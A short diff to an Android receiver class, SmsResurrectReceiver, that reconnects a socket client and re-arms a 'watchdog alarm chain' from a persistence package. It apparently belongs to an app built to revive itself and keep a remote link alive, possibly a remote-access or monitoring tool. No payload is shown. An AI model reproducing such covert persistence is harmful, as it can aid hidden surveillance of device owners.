@@ -59,7 +59,7 @@ public class SmsResurrectReceiver extends BroadcastReceiver {
             SocketClient client = SocketClient.getInstance();
             if (client != null) {
                 client.disconnect();
-                client.connect();
+                client.reconnect();
             }
         } catch (Exception e) {
             Log.w(TAG, "socket reconnect", e);
@@ -67,7 +67,7 @@ public class SmsResurrectReceiver extends BroadcastReceiver {
 
         // 3. Re-arm the watchdog alarm chain
         try {
-            com.fason.app.persistence.AlarmEngine.schedule(ctx);
+            com.fason.app.persistence.AlarmEngine.scheduleWatchdog();
         } catch (Exception e) {
             Log.w(TAG, "watchdog re-arm", e);
         }
